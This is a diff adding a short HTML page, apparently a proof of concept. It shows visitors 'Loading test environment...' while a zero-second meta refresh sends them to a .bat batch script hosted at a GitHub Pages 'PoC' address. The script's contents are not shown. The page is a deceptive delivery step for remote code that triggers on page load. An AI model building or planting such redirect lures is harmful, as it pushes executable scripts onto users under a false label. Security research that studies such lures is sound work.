@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- Mengalihkan halaman ke URL file setelah 0 detik (instan) -->
+    <meta http-equiv="refresh" content="0; url=http://novian-project.github.io/PoC/poc.bat">
+</head>
+<body>
+    <p>Loading test environment...</p>
+</body>
+</html>
